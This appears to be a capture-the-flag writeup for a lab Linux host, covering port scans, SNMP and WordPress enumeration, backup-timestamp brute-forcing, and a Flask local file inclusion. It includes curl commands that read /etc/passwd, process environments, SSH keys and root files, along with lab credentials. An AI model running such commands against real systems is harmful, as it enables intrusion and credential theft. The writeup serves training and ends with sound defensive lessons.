# Fortresses Writeup
```text
=============================================================
PENETRATION TESTING DOCUMENTATION
=============================================================
AUTHOR: vishalgodseye
DATE: 2026-05-29
TARGET: 10.13.37.11
BOX NAME: Fort
ENGAGEMENT TYPE: CTF
=============================================================


SECTION 1: TARGET OVERVIEW
=============================================================

Host "Fort" is an Ubuntu Linux machine running multiple services. The box
is themed around common developer mistakes and introduces a custom web
vector (Python HTTP server on port 5000). The learning curve is gradual,
starting from simple source-code leaks up to SNMP misconfiguration and
custom web application exploitation.

  Operating System   : Ubuntu Linux (kernel 4.15.0-72-generic)
  Hostname           : Leakage
  Total Open Ports   : 3 TCP, 1 UDP

  Service              Port      Protocol
  -------------------  --------  --------
  SSH                  22        TCP
  Apache HTTP          80        TCP
  Python HTTP Server   5000      TCP
  SNMP                 161       UDP

  Services:
    - OpenSSH 7.6p1 (public-key auth only)
    - Apache 2.4.29 with WordPress 5.4-alpha-47225
    - Python BaseHTTPServer (custom app on 5000)
    - SNMP daemon (community string: public)
    - MySQL/MariaDB (confirmed via process enumeration)


SECTION 2: FLAGS CAPTURED
=============================================================

  FLAG #1:
    Value     : AKERVA{Ikn0w_F0rgoTTEN#CoMmeNts}
    Source    : HTML source-code comment on the main web page

  FLAG #2:
    Value     : AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
    Source    : Nmap snmp-processes script output. Flag was passed as a
                command-line argument to the running script
                /var/www/html/scripts/backup_every_17minutes.sh

  FLAG #3:
    Value     : AKERVA{IKNoW###VeRbTamper!nG_==}
    Source    : Inline comment in backup_every_17minutes.sh script
                Retrieved via: curl -i -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
    Note      : Flag hints at HTTP verb tampering as an attack technique

  FLAG #4:
    Value     : AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
    Source    : Hardcoded in /var/www/html/dev/index.py (Flask app source)
                Found inside backup zip: backup_20260602114825.zip
    Note      : Also serves as the HTTP Basic Auth password for the Flask
                app on port 5000 (username: aas)


SECTION 3: ENUMERATION
=============================================================


  3a. NMAP — Port Discovery
  --------------------------------------------------------

  UDP scan (top 100 ports):
    $ nmap -Pn -sU --top-ports 100 10.13.37.11

    PORT    STATE SERVICE
    161/udp open  snmp

  TCP scan (top 1000, ACK ping):
    $ nmap -Pn -PA --top-ports 1000 10.13.37.11

    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    5000/tcp open  upnp

  Version detection:
    $ nmap -sV -p 22,80,5000 10.13.37.11

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
    80/tcp   open  http    Apache httpd 2.4.29 (Ubuntu)
    5000/tcp open  http    Python BaseHTTPServer http.server 2 or 3.0 - 3.1

    Service Info: OS: Linux  |  CPE: cpe:/o:linux:linux_kernel

  Summary:
    — Three TCP ports open: SSH, Apache WordPress, Python HTTP on 5000
    — One UDP port open: SNMP 161


  3b. NMAP — SSH Deep Dive
  --------------------------------------------------------

  Auth methods:
    $ nmap --script ssh-auth-methods -p22 10.13.37.11

    Supported: publickey only (no password auth)

  Terrapin check (CVE-2023-48795):
    Nuclei flagged this SSH as vulnerable to the Terrapin attack. This
    is a MitM protocol downgrade vulnerability. Not directly exploitable
    from a remote client without MitM network position.

  Summary:
    — SSH only accepts public-key authentication
    — Credential stuffing and brute-force are not viable
    — Terrapin is informational only in this engagement context


  3c. SNMP Enumeration
  --------------------------------------------------------

  Community string: public (confirmed via nmap snmp-brute and nuclei
  snmpv1-community-detect-string)

  Full process list extracted via Nmap snmp-processes script.
  Key processes with arguments relevant to the engagement:

    PID   Name / Path
    ----  ---------------------------------------------------------
    980   /usr/sbin/snmpd -Lsd -Lf /dev/null -u Debian-snmp \
          -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f
    1006  /usr/sbin/sshd -D
    1024  /usr/sbin/apache2 -k start
    1033  /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
    1235  /usr/sbin/CRON -f
    1237  /bin/sh -c /opt/check_backup.sh
    1239  /bin/bash /opt/check_backup.sh
    1242  /bin/bash /var/www/html/scripts/backup_every_17minutes.sh \
          AKERVA{IkN0w_SnMP@@@MIsconfigur@T!onS}
    6817  /usr/sbin/CRON -f
    6819  /bin/sh -c /opt/check_devSite.sh
    6820  /bin/bash /opt/check_devSite.sh
    6825  /usr/bin/python /var/www/html/dev/space_dev.py
    6827  /usr/bin/python /var/www/html/dev/space_dev.py

  Summary:
    — SNMP community string is "public" — allows unauthenticated reads
    — FLAG #2 discovered in cron job command-line arguments
    — MySQL is running (mysqld) — credentials likely in wp-config.php
    — Python script /var/www/html/dev/space_dev.py is the custom dev site
    — Cron jobs: /opt/check_backup.sh and /opt/check_devSite.sh
      (harmless watchdog/health-check scripts)


  3d. NUCLEI Scan
  --------------------------------------------------------

  $ nuclei -target http://10.13.37.11

  Findings:

    Template                           Severity  Detail
    ---------------------------------  --------  --------------------------------
    wordpress-eol                      info      WP 5.4 (end of life)
    wordpass-detect (by js)            info      WP 5.4-alpha-47225
    metatag-cms                        info      WordPress 5.4-alpha-47225
    wordpress-theme-detect             info      twentyfifteen
    wordpress-passive-detection        info      theme_slug: twentyfifteen
    wordpress-readme-file              info      /readme.html exposed
    wp-license-file                    info      /license.txt exposed
    wordpress-xmlrpc-detect            info      /xmlrpc.php is enabled
    addeventlistener-detect            info      JavaScript event listeners
    missing-sri                        info      Multiple scripts lack SRI
    wordpress-login                    info      /wp-login.php
    wp-user-enum                       low       username: "aas"
    apache-detect                     info      Apache/2.4.29 (Ubuntu)
    tech-detect:google-font-api        info      Google Fonts loaded
    snmpv1-community-detect-string     high      community="public", name="Leakage"
    snmpv3-detect                      info      net-snmp engine detected
    ssh-server-enumeration             info      OpenSSH 7.6p1
    openssh-detect                     info      SSH banner
    ssh-sha1-hmac-algo                 info      SHA-1 HMAC support
    ssh-auth-methods                   info      publickey only
    CVE-2023-48795                      medium    Terrapin SSH vulnerability
    http-missing-security-headers      info      HSTS, CSP, X-Frame-Options,
                                                X-Content-Type-Options,
                                                Referrer-Policy, Permissions-Policy,
                                                COEP, CORP, COOP all missing

  Summary:
    — WordPress 5.4-alpha-47225 confirmed (EOL, multiple known CVEs)
    — SNMP community "public" is a high-severity finding
    — User "aas" identified via REST API enumeration
    — XML-RPC is enabled (enables user enumeration + brute-force)
    — All major security headers are missing


  3e. Web Directory Enumeration (GOBUSTER)
  --------------------------------------------------------

  $ gobuster dir -u http://10.13.37.11 \
      -w /usr/share/wordlists/dirb/big.txt

  Status    Path             Size
  --------  ---------------  ------
  403       .htaccess        276
  403       .htpasswd        276
  301       /backups/        312
  301       /dev/            308
  301       /javascript/     315
  401       /scripts/        458
  403       server-status    276
  301       /wp-admin/       313
  301       /wp-content/     315
  301       /wp-includes/     316

  Summary:
    — 301 redirects: /backups/, /dev/, /javascript/ (WordPress default)
    — 401: /scripts/ — requires HTTP Basic Authentication
    — 403: .htaccess, .htpasswd, server-status
    — /dev/ is the most promising — confirmed by SNMP to host
      space_dev.py (the custom vector)


  3f. WORDPRESS SCAN (WPSCAN)
  --------------------------------------------------------

  $ wpscan --url http://10.13.37.11 -e u,p,vt,dbe,cb --api-token <TOKEN>

  Version confirmed: WordPress 5.4-alpha-47225

  Potential WP vulnerabilities evaluated:
    - WordPress 5.4 to 5.8: Data Exposure via REST API
    - WordPress < 5.8.3: SQL Injection via WP_Query
    - WP < 6.0.2: SQLi via Link API
    - WP < 6.2.1: Directory Traversal via Translation File

  Result: None of the above were successfully exploited in this engagement.
  The REST API user enumeration did return user "aas" (author ID 1).

  REST API user detail (curl of wp/v2/users):
    {
      "id": 1,
      "name": "aas",
      "slug": "aas",
      "link": "http://10.13.37.11/index.php/author/aas/"
    }

  Summary:
    — WP 5.4 is known to be vulnerable to several CVEs but none were
      exploitable here via automated scanning
    — Manual investigation of /dev/, /backups/, /scripts/ is recommended


SECTION 4: CREDENTIALS DISCOVERED
=============================================================

  4a. Flask Application (Port 5000)
  --------------------------------------------------------
  HTTP Basic Auth (WWW-Authenticate: Basic realm)
    Username : aas
    Password : AKERVA{1kn0w_H0w_TO_$Cr1p_T_$$$$$$$$}
    Source   : Hardcoded in /var/www/html/dev/index.py

  4b. WordPress Database (from wp-config.php)
  --------------------------------------------------------
    DB_NAME     : wordpress
    DB_USER     : wordpress
    DB_PASSWORD : ZokDHE_DJ_____enzU)=
    DB_HOST     : localhost
    Source      : wp-config.php inside backup_20260602114825.zip

  4c. SSH Public Key (aas user)
  --------------------------------------------------------
    The server only accepts public-key authentication for SSH.
    Authorized key for aas@akerva:

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGdcoYsYCI0aGeWVAVokazuOwr7oz1
    sqnTf1LzIwPzoOyEU6C7dj4H86hkF2PK9REYJ8Chc/kuBnWfIdvuAeulqzGeSLbfj5z/
    Kwrz2sMqjbFWa2p/S061Y3s+hvR+BOkWT7FuCO5Q6TmCAMFMmn3jJCpQZCw5sHCAMw0y
    eMcqv36I+PaWZY+vebVHMeI3fEsbCLfqRZ5tPHIOLLCYMM3Ie3hcOPQzPcWk7WHdeqbd
    oE/6JxrwAStYQOoWl12Zf2WKjRl1UppOCxS4KsiueVzMvhunWGZrquiGh5ZOIyhjN1Sv
    wKqYYRMulAFodZE3d5LP+q9HMDaqSHJoQPWyzLd2m+0GgHueX63vFMW0ge9we1Lim2Ue
    B0+nLE3kNAgzV17AjNdUgELM9AFWaHP5WzLo01JyATS1k19jbiqLHERkDcBZA5vr6thea
    rC5xChdijqySroEUelDwx+Ue72nKEnR9pgt7DFR5samZhko42eG+sP4vfOlVYNfVc4x8
    611X6vcGvlM9gL4mBSnDxVc3rK8RoeKXqILcPM8r8W+qyStgOutguvr8TNyQ2OjdbXsZ
    LMUFo12G3IjCmqDgaTlQ9mtnWZPs76GBLpev18PhRWGZ95tfJs7x4UINPmFSfqOFFQxH
    HMjtugPUoGeFNqLq/GsyNTKaxPNExc5hUyff/YZjQ== aas@akerva

    Private key: NOT FOUND on server. Must be obtained to SSH in.


SECTION 5: ATTACK SURFACE SUMMARY
=============================================================

  Service            Port   Vuln / Finding                          Severity
  -----------------  -----  --------------------------------------  --------
  Apache / HTTP      80     WordPress 5.4 (EOL)                    medium
  Apache / HTTP      80     User "aas" enumerated via REST API     low
  Apache / HTTP      80     XML-RPC enabled                         low
  Apache / HTTP      80     All security headers missing            low
  Apache / HTTP      80     /dev/ — custom Python app (vector)     high
  Apache / HTTP      80     /scripts/ — requires auth (401)        high
  Apache / HTTP      80     /backups/ — predictable backup files   critical
                         (timestamp bruteforce, full source leak)
  Apache / HTTP      80     /readme.html version disclosure         low
  Apache / HTTP      80     /license.txt — info leak                low
  Python/Flask       5000   LFI in /file endpoint (full RCE-read)   critical
  Python/Flask       5000   Hardcoded credentials in source         high
  Python/Flask       5000   /download TODO endpoint (unimplemented)  low
  SSH                22     publickey auth only                     info
  SSH                22     CVE-2023-48795 (Terrapin)              medium
  SNMP               161    Community string "public" (read access) high
  MySQL              local  mysqld running, creds in backup         medium


SECTION 6: NEXT STEPS
=============================================================

  Priority  Action
  --------  --------------------------------------------------------------------
  HIGH      Read /opt/check_backup.sh via Flask LFI — may contain SSH private
            key or further credentials. Command:
            curl -u "aas:<password>" "http://10.13.37.11:5000/file?filename=/opt/check_backup.sh"

  HIGH      Obtain aas SSH private key — required for SSH access. Private key
            is NOT on the server filesystem. Check:
            - /opt/check_backup.sh contents
            - Leaked in a future backup rotation
            - MySQL database (wordpress user meta, wp_options)

  HIGH      Capture user flag (/home/aas/user.txt) and root flag via LFI once
            aas shell is obtained:
            curl -u "aas:<password>" "http://10.13.37.11:5000/file?filename=/home/aas/user.txt"
            curl -u "aas:<password>" "http://10.13.37.11:5000/file?filename=/root/root.txt"

      MED   Test MySQL credentials: mysql -u wordpress -p'ZokDHE_DJ_____enzU)=' -h localhost
            Dump WP users table, check wp_options for additional config/secrets.

      MED   Enumerate /xmlrpc.php — attempt brute-force of user "aas" with
            discovered passwords.

      LOW   Crack WordPress user hash offline for dashboard access.

      LOW   Investigate /download Flask endpoint further — responds with errors
            but may leak information via different payloads or methods.


SECTION 7: TOOLS USED
=============================================================

  Tool            Purpose
  --------------- ------------------------------------------------------------
  nmap            Port discovery, service version detection, SNMP
                  process/interface enumeration, SSH auth method detection
  nuclei          Automated vulnerability scanning (web, SSH, SNMP)
  gobuster        Web directory brute-forcing
  wpscan          WordPress-specific vulnerability and enumeration scanning
  curl            Manual HTTP endpoint inspection, LFI exploitation, REST API
                  user enumeration, verb tampering tests
  ffuf v2.1.0     Backup file timestamp bruteforce discovery
  python3         Timestamp wordlist generation
  unzip           Backup archive extraction
  snmpwalk        SNMP enumeration (process list, system info)


SECTION 8: EXPLOITATION WALKTHROUGH
=============================================================

  Step 1 — Backup File Discovery
  --------------------------------------------------------
  The backup script at /var/www/html/scripts/backup_every_17minutes.sh creates
  zip archives in /var/www/html/backups/ with the naming format
  backup_YYYYMMDDHHMMSS.zip. The script removes all old backups before
  creating a new one, so only one file exists at a time.

  Generated a timestamp wordlist around UTC current time:

    python3 -c "
    from datetime import datetime, timedelta
    base = datetime.utcnow()
    with open('timestamps.txt', 'w') as f:
        for i in range(-30, 60):
            t = base + timedelta(seconds=i)
            f.write('backup_' + t.strftime('%Y%m%d%H%M%S') + '.zip\n')
    "

  Ran ffuf and discovered the live backup:

    ffuf -u http://10.13.37.11/backups/FUZZ -w timestamps.txt -mc 200

    Result: backup_20260602114825.zip [Status: 200, Size: 22071775]

  Step 2 — Backup Extraction & Credential Harvesting
  --------------------------------------------------------
  Downloaded and extracted the backup:

    wget http://10.13.37.11/backups/backup_20260602114825.zip
    unzip backup_20260602114825.zip -d backup_contents

  Found wp-config.php with MySQL creds and dev/index.py with Flask app
  source code containing FLAG #4 / password.

  Step 3 — Flask App Exploitation (Port 5000)
  --------------------------------------------------------
  Authenticated to the Flask app using the discovered credentials:

    curl -u "aas:AKERVA{1kn0w_H0w_TO_\$Cr1p_T_\$\$\$\$\$\$\$\$}" \
      http://10.13.37.11:5000/
    -> "Hello, World!"

  Exploited the LFI vulnerability in /file endpoint:

    curl -u "aas:<password>" \
      "http://10.13.37.11:5000/file?filename=/etc/passwd"

  Confirmed full file read access. Key files read:
    - /etc/passwd (user enumeration)
    - /proc/self/environ (Flask process environment)
    - /opt/check_devSite.sh (cron watchdog script)
    - /home/aas/.ssh/authorized_keys (SSH public key)

  Step 4 — Users with Login Shells
  --------------------------------------------------------
    root  -> /root
    aas   -> /home/aas (Lyderic Lefebvre, UID 1000)


SECTION 9: NOTES & LESSONS LEARNED
=============================================================

  MISTAKE #1 — Credentials and flags in source code
    FLAG #1 was found in an HTML source-code comment. Developers should
    never leave sensitive data, even canned flags or test strings, in
    production source. Source code is often served to clients directly.

  MISTAKE #2 — Default SNMP community string ("public")
    The SNMP daemon was configured with the default read-only community
    string "public". This single misconfiguration exposed the entire
    process list (including FLAG #2 as a cron argument), network
    interfaces, and system information. Always use strong, rotated
    community strings or migrate to SNMPv3.

  MISTAKE #3 — Sensitive data in command-line arguments
    FLAG #2 was passed as a literal command-line argument to a cron job
    script. Process arguments are visible in /proc/PID/cmdline and via
    SNMP process enumeration. Sensitive values should be passed via
    environment variables or config files with restricted permissions.

  MISTAKE #4 — Dev sites exposed on production
    The /dev/ path hosts a space_dev.py Python application. Development
    and staging environments should never be accessible on production
    servers. This is a common attack surface in misconfigured deployments.

  MISTAKE #5 — WordPress is end-of-life (5.4) and leaks version info
    WordPress 5.4 is well past end of life with multiple known CVEs.
    Version disclosure via /readme.html and /license.txt lets attackers
    quickly fingerprint applicable exploits. Always disable the readme
    and keep WordPress updated.

  MISTAKE #6 — XML-RPC enabled without restriction
    XML-RPC allows unauthenticated user enumeration and can be abused
    for credential brute-forcing when combined with username discovery.
    It should be disabled if not actively in use by a trusted plugin.

  MISTAKE #7 — No HTTP security headers
    HSTS, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options,
    and others are all missing. These headers protect against a wide
    range of client-side attacks and should be standard on every
    public-facing web application.

  MISTAKE #8 — Backup files publicly accessible
    The backup script stores archives in a web-accessible directory
    (/var/www/html/backups/) with a predictable naming scheme. An attacker
    can brute-force the timestamp to download live backups containing
    source code, credentials, and sensitive configuration files.
    Backups should be stored outside the web root with randomized names
    and access controls.

  MISTAKE #9 — Local File Inclusion in Flask application
    The /file endpoint in the Flask app directly uses user-supplied input
    as a file path with no validation or sanitization. This trivial LFI
    allows reading any file the process can access. File operations should
    whitelist allowed paths and never trust user input for file names.

  MISTAKE #10 — Password/flag hardcoded in application source
    FLAG #4 is hardcoded in the Flask app source as both a literal flag
    string and reused as an HTTP Basic Auth password. Credentials should
    be stored in environment variables or secure config files, never
    in application source code. This was further amplified by the backup
    exposure making the source downloadable.

=============================================================
                    END OF DOCUMENTATION
=============================================================
```
